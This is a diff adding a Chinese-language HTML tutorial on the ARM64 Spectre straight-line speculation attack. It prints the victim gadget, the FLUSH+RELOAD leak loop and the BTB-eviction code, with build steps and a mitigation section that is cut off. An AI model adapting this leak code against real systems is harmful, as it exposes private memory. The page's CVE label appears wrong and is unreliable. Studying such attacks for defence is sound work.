@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spectre SLS - 直线推测攻击深度解析</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #1c2333;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text-dim: #8b949e;
+    --accent: #58a6ff;
+    --accent2: #7ee787;
+    --warn: #d29922;
+    --danger: #f85149;
+    --code-bg: #0d1117;
+    --highlight: rgba(88,166,255,0.15);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.7;
+    max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem;
+  }
+  h1 { font-size: 2.2rem; margin-bottom: 0.3rem; background: linear-gradient(135deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  h2 { font-size: 1.5rem; margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); color: var(--accent); }
+  h3 { font-size: 1.15rem; margin: 1.5rem 0 0.5rem; color: var(--accent2); }
+  .subtitle { color: var(--text-dim); font-size: 1.05rem; margin-bottom: 2rem; }
+  .badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 0.8rem; font-weight: 600; margin-right: 6px; }
+  .badge-blue { background: rgba(88,166,255,0.2); color: var(--accent); }
+  .badge-green { background: rgba(126,231,135,0.2); color: var(--accent2); }
+  .badge-red { background: rgba(248,81,73,0.2); color: var(--danger); }
+  .badge-yellow { background: rgba(210,153,34,0.2); color: var(--warn); }
+
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 1rem 0; }
+  .card-warn { border-left: 4px solid var(--warn); }
+  .card-danger { border-left: 4px solid var(--danger); }
+  .card-info { border-left: 4px solid var(--accent); }
+  .card-success { border-left: 4px solid var(--accent2); }
+
+  pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 1rem 1.2rem; overflow-x: auto; margin: 0.8rem 0; font-size: 0.88rem; line-height: 1.6; }
+  code { font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, monospace; }
+  p code, li code { background: var(--surface2); padding: 2px 6px; border-radius: 4px; font-size: 0.88em; color: var(--accent); }
+  .code-comment { color: #6a737d; }
+  .code-keyword { color: #ff7b72; }
+  .code-type { color: #79c0ff; }
+  .code-string { color: #a5d6ff; }
+  .code-number { color: #79c0ff; }
+  .code-func { color: #d2a8ff; }
+  .code-highlight { background: var(--highlight); display: block; margin: 0 -1.2rem; padding: 0 1.2rem; border-left: 3px solid var(--accent); }
+
+  details { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; margin: 0.8rem 0; }
+  details summary { padding: 0.8rem 1.2rem; cursor: pointer; font-weight: 600; user-select: none; }
+  details summary:hover { background: var(--surface2); }
+  details[open] summary { border-bottom: 1px solid var(--border); }
+  details .detail-body { padding: 1rem 1.2rem; }
+
+  .diagram-container { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1rem 0; overflow-x: auto; }
+  .flow-steps { display: flex; flex-direction: column; gap: 0; }
+  .flow-step { display: flex; align-items: flex-start; gap: 1rem; position: relative; }
+  .flow-step-num { flex-shrink: 0; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.9rem; position: relative; z-index: 1; }
+  .flow-step-line { position: absolute; left: 17px; top: 36px; bottom: -1px; width: 2px; }
+  .flow-step:last-child .flow-step-line { display: none; }
+  .flow-step-content { flex: 1; padding-bottom: 1.5rem; }
+  .flow-step-title { font-weight: 600; margin-bottom: 0.3rem; }
+  .flow-step-desc { color: var(--text-dim); font-size: 0.92rem; }
+
+  .step-flush .flow-step-num { background: rgba(210,153,34,0.2); color: var(--warn); }
+  .step-flush .flow-step-line { background: var(--warn); }
+  .step-spec .flow-step-num { background: rgba(248,81,73,0.2); color: var(--danger); }
+  .step-spec .flow-step-line { background: var(--danger); }
+  .step-leak .flow-step-num { background: rgba(126,231,135,0.2); color: var(--accent2); }
+  .step-leak .flow-step-line { background: var(--accent2); }
+  .step-train .flow-step-num { background: rgba(88,166,255,0.2); color: var(--accent); }
+  .step-train .flow-step-line { background: var(--accent); }
+
+  table { width: 100%; border-collapse: collapse; margin: 0.8rem 0; font-size: 0.92rem; }
+  th { background: var(--surface2); text-align: left; padding: 0.6rem 1rem; border: 1px solid var(--border); color: var(--accent); }
+  td { padding: 0.6rem 1rem; border: 1px solid var(--border); }
+  tr:hover td { background: var(--surface); }
+
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 1.5rem 0; }
+  .toc-title { font-weight: 700; margin-bottom: 0.5rem; color: var(--accent); }
+  .toc ol { padding-left: 1.5rem; }
+  .toc li { margin: 0.3rem 0; }
+  .toc a { color: var(--text-dim); text-decoration: none; }
+  .toc a:hover { color: var(--accent); }
+
+  .compare-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0; }
+  .compare-grid > div { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem; }
+  .compare-label { font-weight: 700; font-size: 0.9rem; margin-bottom: 0.8rem; }
+  .compare-label.vuln { color: var(--danger); }
+  .compare-label.fix { color: var(--accent2); }
+
+  .mem-layout { display: flex; flex-direction: column; gap: 2px; font-family: monospace; font-size: 0.82rem; margin: 1rem 0; }
+  .mem-row { display: flex; align-items: stretch; min-height: 32px; }
+  .mem-addr { width: 140px; padding: 4px 8px; background: var(--surface2); color: var(--text-dim); display: flex; align-items: center; flex-shrink: 0; }
+  .mem-content { flex: 1; padding: 4px 12px; display: flex; align-items: center; border-left: 3px solid transparent; }
+  .mem-public { background: rgba(88,166,255,0.1); border-left-color: var(--accent); }
+  .mem-private { background: rgba(248,81,73,0.1); border-left-color: var(--danger); }
+  .mem-oracle { background: rgba(126,231,135,0.1); border-left-color: var(--accent2); }
+  .mem-gap { background: var(--surface); color: var(--text-dim); font-style: italic; border-left-color: var(--border); }
+
+  .sim-container { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1rem 0; }
+  .sim-controls { display: flex; gap: 0.8rem; margin-bottom: 1rem; flex-wrap: wrap; }
+  .sim-btn { padding: 0.5rem 1.2rem; border: 1px solid var(--border); border-radius: 6px; background: var(--surface2); color: var(--text); cursor: pointer; font-size: 0.9rem; transition: all 0.2s; }
+  .sim-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .sim-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  .sim-log { background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem; margin-top: 1rem; max-height: 250px; overflow-y: auto; font-family: monospace; font-size: 0.82rem; color: var(--text-dim); }
+  .sim-log .log-entry { margin: 2px 0; }
+  .sim-log .log-flush { color: var(--warn); }
+  .sim-log .log-spec { color: var(--danger); }
+  .sim-log .log-leak { color: var(--accent2); }
+  .sim-log .log-train { color: var(--accent); }
+
+  .oracle-grid { display: grid; grid-template-columns: repeat(16, 1fr); gap: 2px; margin: 0.5rem 0; }
+  .oracle-cell { aspect-ratio: 1; border-radius: 3px; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-family: monospace; transition: all 0.3s; }
+  .oracle-cold { background: var(--surface2); color: var(--text-dim); }
+  .oracle-warm { background: rgba(126,231,135,0.3); color: var(--accent2); box-shadow: 0 0 8px rgba(126,231,135,0.3); }
+  .oracle-hot { background: rgba(248,81,73,0.4); color: var(--danger); box-shadow: 0 0 12px rgba(248,81,73,0.4); }
+
+  @media (max-width: 768px) {
+    body { padding: 1rem; }
+    h1 { font-size: 1.6rem; }
+    pre { font-size: 0.8rem; padding: 0.8rem; }
+    .compare-grid { grid-template-columns: 1fr; }
+  }
+  [id] { scroll-margin-top: 1rem; }
+</style>
+</head>
+<body>
+
+<h1>Spectre SLS 直线推测攻击深度解析</h1>
+<p class="subtitle">
+  <span class="badge badge-red">CVE-2020-1384</span>
+  <span class="badge badge-blue">ARM64</span>
+  <span class="badge badge-yellow">Straight-Line Speculation</span>
+  <span class="badge badge-green">Google SafeSide</span>
+</p>
+<p style="color:var(--text-dim); margin-bottom: 1.5rem;">
+  利用 ARM64 处理器在间接分支（BR 指令）目标未解析时推测执行后续直线代码的硬件行为，通过 BTB 驱逐和缓存 Flush 制造推测窗口，结合 FLUSH+RELOAD 侧信道泄漏私有数据。
+</p>
+
+<nav class="toc">
+  <div class="toc-title">目录</div>
+  <ol>
+    <li><a href="#overview">攻击概览与核心思想</a></li>
+    <li><a href="#prerequisites">前置知识</a></li>
+    <li><a href="#architecture">整体架构与数据流</a></li>
+    <li><a href="#flow">攻击流程详解 (5 步)</a></li>
+    <li><a href="#code">源码逐行解析</a></li>
+    <li><a href="#btb">BTB 驱逐机制详解</a></li>
+    <li><a href="#simulation">交互式模拟演示</a></li>
+    <li><a href="#design">关键设计决策</a></li>
+    <li><a href="#build">构建与运行</a></li>
+    <li><a href="#mitigation">防御与缓解</a></li>
+    <li><a href="#affected">受影响平台</a></li>
+  </ol>
+</nav>
+
+<h2 id="overview">1. 攻击概览与核心思想</h2>
+
+<div class="card card-info">
+  <h3>一句话总结</h3>
+  <p>在 ARM64 上，当间接分支（<code>BR</code>）的目标地址因缓存未命中而延迟解析时，CPU 会<strong>推测性地执行 BR 后面紧邻的指令</strong>（直线推测）。攻击者利用这个推测窗口加载秘密数据并通过缓存侧信道泄漏。</p>
+</div>
+
+<h3>攻击名称解析</h3>
+<table>
+  <tr><th>组件</th><th>含义</th><th>本 Demo 中的体现</th></tr>
+  <tr><td><strong>Spectre</strong></td><td>推测执行侧信道攻击家族</td><td>利用推测执行的微架构副作用泄漏数据</td></tr>
+  <tr><td><strong>SLS</strong></td><td>Straight-Line Speculation — 直线推测</td><td>CPU 在 BR 后推测执行紧邻的后续指令</td></tr>
+  <tr><td><strong>CVE-2020-1384</strong></td><td>ARM 官方安全公告编号</td><td>2020 年由 ARM 披露的硬件漏洞</td></tr>
+</table>
+
+<h3>核心攻击链</h3>
+<div class="diagram-container">
+  <div style="text-align:center; font-family: monospace; font-size: 0.9rem; line-height: 2.2; color: var(--text-dim);">
+    <span style="color:var(--warn)">Flush 分支目标</span>
+    <span style="color:var(--text-dim)"> ──→ </span>
+    <span style="color:var(--accent)">BTB 驱逐</span>
+    <span style="color:var(--text-dim)"> ──→ </span>
+    <span style="color:var(--danger)">BR 直线推测执行</span>
+    <span style="color:var(--text-dim)"> ──→ </span>
+    <span style="color:var(--accent2)">缓存时序泄漏</span>
+    <span style="color:var(--text-dim)"> ──→ </span>
+    <span style="color:var(--text)">恢复秘密字节</span>
+  </div>
+</div>
+
+<h2 id="prerequisites">2. 前置知识</h2>
+
+<details>
+  <summary>什么是直线推测 (Straight-Line Speculation)？</summary>
+  <div class="detail-body">
+    <p>当 CPU 遇到间接分支（如 ARM64 的 <code>BR Xn</code>）时，需要读取寄存器中的目标地址才能知道跳转到哪里。如果目标地址需要从内存加载（缓存未命中），CPU 不会停下来等待，而是<strong>推测性地取指并执行分支后面紧邻的指令</strong>。</p>
+    <p>这与条件分支的误预测不同：条件分支是"猜错了方向"，而 SLS 是"在目标解析前就执行了不该执行的代码"。当目标最终解析后，推测结果被丢弃，但缓存副作用保留。</p>
+  </div>
+</details>
+
+<details>
+  <summary>什么是 BTB (Branch Target Buffer)？</summary>
+  <div class="detail-body">
+    <p>BTB 是 CPU 内部用于预测<strong>间接分支目标地址</strong>的硬件结构。它记录每个分支指令 PC 上次跳转到的目标地址。</p>
+    <p>如果 BTB 中有某个 BR 指令的预测条目，CPU 会立即开始推测执行预测目标处的代码。但如果 BTB 中<strong>没有</strong>该 BR 的条目（BTB miss），某些 CPU 会推测执行 BR 后面的直线代码 — 这正是 SLS 攻击利用的行为。</p>
+    <p>因此，攻击者需要<strong>驱逐 BTB 条目</strong>，确保目标 BR 指令在 BTB 中 miss。</p>
+  </div>
+</details>
+
+<details>
+  <summary>什么是 FLUSH+RELOAD？</summary>
+  <div class="detail-body">
+    <p>一种缓存侧信道技术，分三步：</p>
+    <ol>
+      <li><strong>Flush</strong>：用 <code>dc civac</code>（ARM64）将目标内存从缓存中驱逐</li>
+      <li><strong>(Speculative) Access</strong>：推测执行期间，CPU 根据秘密数据访问某个缓存行</li>
+      <li><strong>Reload</strong>：用 <code>MeasureReadLatency</code> 测量所有缓存行的读取延迟，被访问过的行读取更快 → 泄漏了秘密数据</li>
+    </ol>
+  </div>
+</details>
+
+<details>
+  <summary>ARM64 间接分支指令 BR</summary>
+  <div class="detail-body">
+    <p><code>BR Xn</code> 是 ARM64 的无条件间接分支指令，跳转到寄存器 Xn 中存储的地址。与 <code>BLR</code>（带链接的分支）不同，<code>BR</code> 不保存返回地址到 X30。</p>
+    <p>在函数指针调用、虚函数调用、switch-case 跳转等场景中广泛使用。SLS 攻击正是针对这类间接分支的推测行为。</p>
+  </div>
+</details>
+
+<h2 id="architecture">3. 整体架构与数据流</h2>
+
+<h3>组件关系图</h3>
+<div class="diagram-container">
+<pre style="border:none; margin:0; background:transparent; color: var(--text-dim); font-size: 0.85rem;">
+┌─────────────────────────────────────────────────────────────────────┐
+│                        spectre_sls.cc                               │
+│                                                                     │
+│  main()                                                             │
+│    │                                                                │
+│    ├─ inc_counter thread        ← 后台线程持续递增计数器              │
+│    ├─ ibtb_flush() warmup       ← 预热 BTB 驱逐机制                 │
+│    ├─ calibrate_miss_min()      ← 校准缓存 miss 阈值                │
+│    │                                                                │
+│    └─ for each byte i of private_data:                              │
+│         └─ LeakByte(i)                                              │
+│              │                                                      │
+│              ├─ CacheSideChannel sidechannel  ← 256×4096B oracle    │
+│              │    └─ FlushOracle()            ← 清空全部缓存行       │
+│              │                                                      │
+│              ├─ FlushDataCacheLine(g_target)  ← flush 分支目标       │
+│              ├─ ibtb_flush()                  ← 驱逐 BTB 条目       │
+│              │                                                      │
+│              ├─ victim()                                            │
+│              │    ├─ br %[go]                 ← 间接分支 (目标延迟)  │
+│              │    ├─ ldrb w3, [secret]        ← 推测: 加载秘密字节   │
+│              │    ├─ add x3, oracle, w3*4096  ← 推测: 计算 oracle   │
+│              │    └─ ldr x4, [x3]             ← 推测: 访问 oracle   │
+│              │                                                      │
+│              └─ AddHitAndRecomputeScores()    ← FLUSH+RELOAD 检测   │
+│                   └─ MeasureReadLatency()     ← 汇编级时序测量       │
+└─────────────────────────────────────────────────────────────────────┘
+</pre>
+</div>
+
+<h3>Victim 函数内存布局</h3>
+<div class="mem-layout">
+  <div class="mem-row">
+    <div class="mem-addr">g_target (flushed)</div>
+    <div class="mem-content mem-gap">函数指针，指向 dummy_target。被 flush 出缓存，LDR 加载延迟 ~100+ cycles</div>
+  </div>
+  <div class="mem-row">
+    <div class="mem-addr">victim code</div>
+    <div class="mem-content mem-public"><code>br x0</code> → <code>ldrb</code> → <code>add</code> → <code>ldr</code> — BR 后的推测 payload</div>
+  </div>
+  <div class="mem-row">
+    <div class="mem-addr">private_data</div>
+    <div class="mem-content mem-private"><code>"It's a s3kr3t!!!"</code> — 推测执行期间被加载的秘密字符串</div>
+  </div>
+  <div class="mem-row">
+    <div class="mem-addr">CacheSideChannel</div>
+    <div class="mem-content mem-oracle">256 个 BigByte 元素 (各 4096B)，推测执行时按秘密字节索引访问</div>
+  </div>
+</div>
+
+<h2 id="flow">4. 攻击流程详解</h2>
+
+<div class="flow-steps">
+  <div class="flow-step step-flush">
+    <div class="flow-step-num">1</div>
+    <div class="flow-step-line"></div>
+    <div class="flow-step-content">
+      <div class="flow-step-title">Flush Oracle + 分支目标</div>
+      <div class="flow-step-desc">
+        <code>sidechannel.FlushOracle()</code> 清空 256 个 oracle 元素的缓存行。<br>
+        <code>FlushDataCacheLine(g_target)</code> 将函数指针从缓存驱逐，使后续 <code>LDR x0, [g_target]</code> 产生 ~100+ cycles 的延迟。这个延迟就是推测执行窗口。
+      </div>
+    </div>
+  </div>
+
+  <div class="flow-step step-train">
+    <div class="flow-step-num">2</div>
+    <div class="flow-step-line"></div>
+    <div class="flow-step-content">
+      <div class="flow-step-title">BTB 驱逐 — ibtb_flush()</div>
+      <div class="flow-step-desc">
+        执行 6000 次间接分支（4 个不同 PC 的 BR 循环 6000 次），用大量不同的分支 PC 填满 BTB，驱逐 victim 函数中目标 BR 指令的 BTB 条目。
+        <br><br>
+        <strong>为什么需要 BTB miss？</strong> 如果 BTB 中有该 BR 的预测条目，CPU 会立即推测跳转到预测目标（dummy_target），而不是推测执行 BR 后面的直线代码。BTB miss 迫使 CPU 在目标解析前推测执行直线代码。
+      </div>
+    </div>
+  </div>
+
+  <div class="flow-step step-spec">
+    <div class="flow-step-num">3</div>
+    <div class="flow-step-line"></div>
+    <div class="flow-step-content">
+      <div class="flow-step-title">执行 victim — BR 直线推测</div>
+      <div class="flow-step-desc">
+        <code>victim()</code> 中的 <code>br %[go]</code> 执行时：
+        <ul style="margin-top:0.5rem;">
+          <li>目标地址 <code>*g_target</code> 需要从内存加载（已被 flush）</li>
+          <li>BTB 中没有该 BR 的预测条目（已被驱逐）</li>
+          <li>CPU 推测执行 BR 后面的三条指令：
+            <ul>
+              <li><code>ldrb w3, [secret_addr]</code> — 加载秘密字节</li>
+              <li><code>add x3, oracle, w3, lsl 12</code> — 计算 oracle 地址</li>
+              <li><code>ldr x4, [x3]</code> — 访问 oracle（缓存副作用！）</li>
+            </ul>
+          </li>
+        </ul>
+        <div class="card card-danger" style="margin-top:0.8rem;">
+          <strong>关键：</strong>当 <code>LDR</code> 最终完成、BR 目标解析后，CPU 发现推测路径错误，丢弃推测结果。但 <strong>oracle 的缓存状态已经改变</strong> — 秘密字节被编码进了缓存。
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="flow-step step-leak">
+    <div class="flow-step-num">4</div>
+    <div class="flow-step-line"></div>
+    <div class="flow-step-content">
+      <div class="flow-step-title">FLUSH+RELOAD — 恢复秘密字节</div>
+      <div class="flow-step-desc">
+        <code>AddHitAndRecomputeScores()</code> 注入一个已知的架构级缓存命中作为参考，然后测量 256 个 oracle 元素的读取延迟。被推测执行加载的元素延迟显著低于其他元素 → 其索引就是秘密字节的值。
+      </div>
+    </div>
+  </div>
+
+  <div class="flow-step step-leak">
+    <div class="flow-step-num">5</div>
+    <div class="flow-step-line"></div>
+    <div class="flow-step-content">
+      <div class="flow-step-title">重复直到收敛 — 逐字节泄漏</div>
+      <div class="flow-step-desc">
+        外层循环重复步骤 1-4，最多 200000 次。当某个 oracle 索引的得分超过其他索引得分的 2 倍 + 40 时，确认该字节为泄漏结果。<code>main()</code> 对 private_data 的每个字节调用 <code>LeakByte</code>，最终打印出完整的 <code>"It's a s3kr3t!!!"</code>。
+      </div>
+    </div>
+  </div>
+</div>
+
+<h2 id="code">5. 源码逐行解析</h2>
+
+<h3>victim — 核心 Gadget（内联汇编）</h3>
+<pre><code><span class="code-keyword">int</span> <span class="code-func">victim</span>(<span class="code-keyword">const char</span> *secret_addr, <span class="code-type">uint64_t</span> godummy,
+           <span class="code-keyword">void</span> *channel_base) {
+    <span class="code-func">asm volatile</span>(
+<span class="code-highlight">        <span class="code-string">" br %[go]\n"</span>              <span class="code-comment">// 间接分支 → dummy_target (目标延迟)</span></span>
+<span class="code-highlight">        <span class="code-string">" ldrb w3, [%[sec]]\n"</span>     <span class="code-comment">// 推测: 加载 private_data[offset]</span></span>
+<span class="code-highlight">        <span class="code-string">" add x3, %[ch], x3, lsl 12\n"</span> <span class="code-comment">// 推测: oracle + secret_byte × 4096</span></span>
+<span class="code-highlight">        <span class="code-string">" ldr x4, [x3]\n"</span>          <span class="code-comment">// 推测: 访问 oracle → 缓存副作用</span></span>
+        :
+        : [<span class="code-type">sec</span>] <span class="code-string">"r"</span>(secret_addr),
+          [<span class="code-type">go</span>]  <span class="code-string">"r"</span>(godummy),
+          [<span class="code-type">ch</span>]  <span class="code-string">"r"</span>(channel_base)
+        : <span class="code-string">"x3"</span>, <span class="code-string">"x4"</span>, <span class="code-string">"memory"</span>);
+    <span class="code-keyword">return</span> <span class="code-number">0</span>;
+}</code></pre>
+
+<div class="card card-warn">
+  <strong>为什么用 <code>ldr x4</code> 而不是 <code>ldrb w4</code>？</strong>
+  <code>LDR</code>（64-bit load）比 <code>LDRB</code>（8-bit load）产生更大的缓存行访问，在某些微架构上能产生更强的缓存副作用信号，提高侧信道信噪比。
+</div>
+
+<h3>LeakByte — 泄漏控制循环</h3>
+<pre><code><span class="code-keyword">static char</span> <span class="code-func">LeakByte</span>(<span class="code-type">size_t</span> offset) {
+    <span class="code-type">CacheSideChannel</span> sidechannel;
+
+    <span class="code-keyword">for</span> (<span class="code-type">int</span> run = <span class="code-number">0</span>; run &lt; <span class="code-number">200000</span>; ++run) {
+        sidechannel.<span class="code-func">FlushOracle</span>();           <span class="code-comment">// ① 清空 oracle 缓存</span>
+
+        *g_target = (<span class="code-type">uint64_t</span>)&amp;dummy_target;
+<span class="code-highlight">        <span class="code-func">FlushDataCacheLine</span>(g_target);       <span class="code-comment">// ② flush 分支目标 → 制造延迟</span></span>
+        <span class="code-func">MemoryAndSpeculationBarrier</span>();
+
+<span class="code-highlight">        <span class="code-func">ibtb_flush</span>();                       <span class="code-comment">// ③ 驱逐 BTB 条目</span></span>
+        <span class="code-func">FlushDataCacheLine</span>(g_target);       <span class="code-comment">// ④ 再次 flush (ibtb 可能回填)</span>
+        <span class="code-func">MemoryAndSpeculationBarrier</span>();
+
+        <span class="code-func">victim</span>(&amp;private_data[offset],       <span class="code-comment">// ⑤ 执行 gadget</span>
+               *g_target,
+               (<span class="code-keyword">void</span> *)sidechannel.<span class="code-func">GetOracle</span>().<span class="code-func">data</span>());
+
+        <span class="code-func">ibtb_flush</span>();                       <span class="code-comment">// ⑥ 再次驱逐 BTB (防止学习)</span>
+
+        <span class="code-type">std::pair&lt;bool, char&gt;</span> result =
+            sidechannel.<span class="code-func">AddHitAndRecomputeScores</span>(); <span class="code-comment">// ⑦ 检测泄漏</span>
+        <span class="code-keyword">if</span> (result.first)
+            <span class="code-keyword">return</span> result.second;
+    }
+    <span class="code-type">std::cerr</span> &lt;&lt; <span class="code-string">"Does not coverage"</span> &lt;&lt; <span class="code-type">std::endl</span>;
+    <span class="code-keyword">return</span> <span class="code-string">'?'</span>;
+}</code></pre>
+
+<h2 id="btb">6. BTB 驱逐机制详解</h2>
+
+<h3>ibtb_flush 实现</h3>
+<pre><code><span class="code-keyword">__attribute__</span>((<span class="code-func">aligned</span>(<span class="code-number">32</span>))) <span class="code-keyword">int</span> <span class="code-func">ibtb_flush</span>() {
+    <span class="code-func">asm volatile</span>(
+        <span class="code-string">" .rept 6000\n"</span>                  <span class="code-comment">// 重复 6000 次</span>
+        <span class="code-string">"   adr x0, 3f\n  br x0\n"</span>       <span class="code-comment">// BR @ PC_1 → label 3</span>
+        <span class="code-string">"   nop\n"</span>
+        <span class="code-string">" 1: adr x0, 4f\n  br x0\n"</span>       <span class="code-comment">// BR @ PC_2 → label 4</span>
+        <span class="code-string">"   nop\n"</span>
+        <span class="code-string">" 2: nop\n"</span>
+        <span class="code-string">"    adr x0, 1b\n  br x0\n"</span>       <span class="code-comment">// BR @ PC_3 → label 1</span>
+        <span class="code-string">"    nop\n"</span>
+        <span class="code-string">" 3: nop\n"</span>
+        <span class="code-string">"    adr x0, 2b\n  br x0\n"</span>       <span class="code-comment">// BR @ PC_4 → label 2</span>
+        <span class="code-string">"    nop\n"</span>
+        <span class="code-string">" 4: nop\n"</span>
+        <span class="code-string">" .endr\n"</span>
+        : : : <span class="code-string">"x0"</span>);
+    <span class="code-keyword">return</span> <span class="code-number">0</span>;
+}</code></pre>
+
+<div class="card card-info">
+  <h3>设计原理</h3>
+  <p>每次循环产生 4 个不同 PC 的间接分支，6000 次循环 = <strong>24000 个 BR 指令</strong>，每个 BR 在 BTB 中占据一个条目。这足以驱逐大多数 CPU 的 BTB 中 victim 函数 BR 指令的预测条目。</p>
+  <p>4 个 BR 形成循环跳转（1→3→2→4→1...），确保建筑学执行正确完成，不会崩溃。</p>
+</div>
+
+<h3>为什么需要两次 ibtb_flush？</h3>
+<div class="card card-warn">
+  <p>第一次 <code>ibtb_flush()</code> 在 <code>victim()</code> 调用前执行，驱逐 BTB 条目。但 <code>ibtb_flush()</code> 本身的 24000 个 BR 指令可能会在 BTB 中留下新的条目，这些条目可能影响 victim 中 BR 的推测行为。</p>
+  <p>第二次 <code>ibtb_flush()</code> 在 <code>victim()</code> 调用后执行，防止 victim 的 BR 被 BTB 学习到目标地址，确保下一轮迭代时 BTB 仍然是 miss 状态。</p>
+</div>
+
+<h2 id="simulation">7. 交互式模拟演示</h2>
+
+<div class="sim-container">
+  <p style="margin-bottom:1rem; color:var(--text-dim);">模拟 Spectre SLS 的核心流程。点击按钮逐步观察攻击过程。</p>
+  <div class="sim-controls">
+    <button class="sim-btn" onclick="simReset()">重置</button>
+    <button class="sim-btn" onclick="simFlush()">① Flush</button>
+    <button class="sim-btn" onclick="simBTB()">② BTB 驱逐</button>
+    <button class="sim-btn" onclick="simSpec()">③ 直线推测</button>
+    <button class="sim-btn" onclick="simReload()">④ FLUSH+RELOAD</button>
+    <button class="sim-btn" onclick="simAuto()">▶ 自动演示</button>
+  </div>
+
+  <div>
+    <h3 style="margin-bottom:0.5rem;">Cache Oracle 状态 (256 个元素)</h3>
+    <p style="font-size:0.85rem; color:var(--text-dim); margin-bottom:0.5rem;">
+      <span style="color:var(--text-dim)">■ 冷(已flush)</span> &nbsp;
+      <span style="color:var(--accent2)">■ 温(合法访问)</span> &nbsp;
+      <span style="color:var(--danger)">■ 热(推测执行加载)</span>
+    </p>
+    <div class="oracle-grid" id="oracle-grid"></div>
+  </div>
+
+  <div class="sim-log" id="sim-log">
+    <div class="log-entry" style="color:var(--text-dim);">等待操作...</div>
+  </div>
+</div>
+
+<h2 id="design">8. 关键设计决策</h2>
+
+<details>
+  <summary>为什么用 ibtb_flush 而不是多 PC 变体？</summary>
+  <div class="detail-body">
+    <p>早期版本使用 32 个不同 PC 的 BR+payload 变体（<code>.rept 32</code>），每次 run 选不同变体使 BTB miss。但这种方法生成的二进制体积大（32 × 32 bytes = 1KB 纯 gadget 代码），且在某些微架构上效果不稳定。</p>
+    <p><code>ibtb_flush</code> 方法更简洁：用一个独立的 BTB 驱逐函数在每次 victim 调用前后清理 BTB，确保 victim 中的单个 BR 始终 BTB miss。代码更紧凑，逻辑更清晰。</p>
+  </div>
+</details>
+
+<details>
+  <summary>为什么需要 inc_counter 后台线程？</summary>
+  <div class="detail-body">
+    <p>后台线程持续递增一个 volatile 计数器并执行 <code>DMB OSHST</code>（数据内存屏障），目的是：</p>
+    <ol>
+      <li>占用另一个 CPU 核心，减少调度干扰</li>
+      <li><code>DMB OSHST</code> 确保写操作对其他核心可见，增加系统总线活动</li>
+      <li>在某些微架构上，这有助于稳定推测执行窗口的时序</li>
+    </ol>
+  </div>
+</details>
+
+<details>
+  <summary>为什么用 AddHitAndRecomputeScores 而不是 RecomputeScores？</summary>
+  <div class="detail-body">
+    <p><code>RecomputeScores(safe_char)</code> 需要一个已知的"安全"缓存命中作为参考阈值。但在 SLS 攻击中，秘密数据<strong>只在推测执行中被访问</strong>，没有架构级的缓存命中。</p>
+    <p><code>AddHitAndRecomputeScores()</code> 会注入一个已知的人工缓存命中（按轮次递增的索引），提供阈值参考，然后检测哪个 oracle 条目被推测访问。</p>
+  </div>
+</details>
+
+<details>
+  <summary>为什么 g_target 要 flush 两次？</summary>
+  <div class="detail-body">
+    <p>第一次 flush 在 <code>ibtb_flush()</code> 之前。但 <code>ibtb_flush()</code> 执行 24000 个 BR 指令，可能通过缓存预取器或共享缓存集将 <code>g_target</code> 重新加载回缓存。第二次 flush 确保 <code>g_target</code> 在进入 <code>victim()</code> 时确实不在缓存中。</p>
+  </div>
+</details>
+
+<details>
+  <summary>calibrate_miss_min 的作用</summary>
+  <div class="detail-body">
+    <p>通过 250 轮测量，确定缓存 miss 和 cache hit 的延迟阈值。这个阈值用于区分 oracle 条目是否被推测访问。不同 CPU 微架构的缓存延迟差异很大，校准确保阈值适配当前硬件。</p>
+  </div>
+</details>
+
+<h2 id="build">9. 构建与运行</h2>
+
+<h3>构建</h3>
+<pre><code><span class="code-comment"># 基本构建</span>
+cmake -B build .
+cmake --build build --target spectre_sls --parallel
+
+<span class="code-comment"># 构建防护版本</span>
+cmake --build build --target spectre_sls_mitigate --parallel</code></pre>
+
+<h3>运行</h3>
+<pre><code><span class="code-comment"># 攻击版本 — 预期泄漏成功</span>
+./build/demos/spectre_sls
+<span class="code-comment"># 输出: Leaking the string: It's a s3kr3t!!!</span>
+
+<span class="code-comment"># 防护版本 — 预期泄漏失败</span>
+./build/demos/spectre_sls_mitigate
+<span class="code-comment"># 输出: Attempting to leak (with SLS mitigation): ???... 或 Does not converge</span></code></pre>
+
+<div class="card card-success">
+  <strong>运行条件：</strong>需要支持乱序执行的 ARM64 处理器。在 AWS Graviton3 (Neoverse V1)、Graviton4 (Neoverse V2)、Apple M1/M2 等平台上已验证。
+</div>
+
+<h2 id="mitigation">10. 防御与缓解</h2>
+
+<h3>代码级对比</h3>
+<div class="compare-grid">
+  <div>
+    <div class="compare-label vuln">✘ VULNERABLE (spectre_sls.cc)</div>
+    <pre style="margin:0; border:none; padding:0.5rem 0; font-size:0.85rem;">
+<span style="color:var(--accent)">br</span>   %[go]
